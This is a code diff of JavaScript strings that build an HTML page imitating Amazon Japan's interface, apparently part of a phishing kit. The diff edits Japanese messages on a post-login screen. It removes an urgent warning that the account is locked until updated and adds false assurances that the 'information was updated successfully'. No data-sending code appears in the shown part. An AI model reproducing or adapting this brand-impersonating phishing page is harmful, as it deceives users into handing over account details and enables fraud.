@@ -92,7 +92,7 @@
                  "     <div class=\"a-declarative\" data-action=\"glow-sheet-trigger\" id=\"nav-global-location-slot\"> \n" +
                  "      <div class=\"nav-sprite\" id=\"nav-packard-glow-loc-icon\"></div> \n" +
                  "      <div id=\"glow-ingress-block\"> \n" +
-                 "       <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"> アメリカ合衆国にお届け </span> \n" +
+                 "       <span class=\"nav-single-line\" id=\"glow-ingress-single-line\"> 日本にお届け </span> \n" +
                  "      </div> \n" +
                  "      <input data-addnewaddress=\"new\" id=\"unifiedLocation1ClickAddress\" name=\"addressID\" type=\"hidden\" value=\"\" /> \n" +
                  "     </div> \n" +
@@ -333,21 +333,12 @@
                  "                        </div>\n" +
                  "                        <div class=\"row\">\n" +
                  "                            <div class=\"col-xs-12 col-sm-6 col-sm-offset-3 logon-box\" id=\"logonbox\">\n" +
-                 "                                <br>\n" +
-                 "                                 <div style=\"background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto; box-shadow: 0 2px 10px 4px rgba(0,0,0,0.25);margin-left:10px;margin-right:10px;\">\n" +
-                 "                                   <h3 class=\"u-focus in-progress\" tabindex=\"-1\" id=\"logoff-header\">\n" +
-                 "                                       <font style=\"color:red;\">\n" +
-                 "                                           <center>更新するまでアカウントにアクセスできません</center>\n" +
-                 "                                       </font>\n" +
-                 "                                     </h3>\n" +
-                 "                                </div>\n" +
-                 "                                <br>\n" +
                  "                                <link rel=\"stylesheet\" type=\"text/css\" href=\"#\">\n" +
                  "                               <div style=\"background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin-left: 10px;margin-right:10px;margin-bottom:25px; box-shadow: 0 2px 10px 4px rgba(0,0,0,0.25);\" class=\"jpui raised \">\n" +
                  "                                    <div class=\"row\" style=\"margin-left:10px;margin-right:10px;\">\n" +
                  "                                        <div class=\"col-xs-10 col-xs-offset-1\">\n" +
                  "                                            <div style=\"text-align: center;\">\n" +
-                 "                                                <h2>メールをリンク<span class=\"util high-contrast\"></span></h2>\n" +
+                 "                                                <h2>情報が正常に更新されました<span class=\"util high-contrast\"></span></h2>\n" +
                  "                                                <br>\n" +
                  "                                                <style type=\"text/css\">\n" +
                  "                                                  .jpui.progress.rectangles{\n" +
@@ -394,9 +385,9 @@
                  "                                            </div>\n" +
                  "                                            <br>\n" +
                  "                                            <div align=\"center\" style=\"color: #9e9e9e;\">\n" +
+                 "                                                <h3>情報が正常に更新されました<span class=\"util high-contrast\"></span></h3>\n" +
                  "                                                <h3>今、あなたは私たちのサービスを楽しむことができます<span class=\"util high-contrast\"></span></h3>\n" +
                  "                                                <h3>信頼できるサービスをお選びいただきありがとうございます<span class=\"util high-contrast\"></span></h3>\n" +
-                 "                                                <h3>アカウントは24時間以内に確認されます<span class=\"util high-contrast\"></span></h3>\n" +
                  "                                            </div>\n" +
                  "\n" +
                  "                                            <br>\n" +
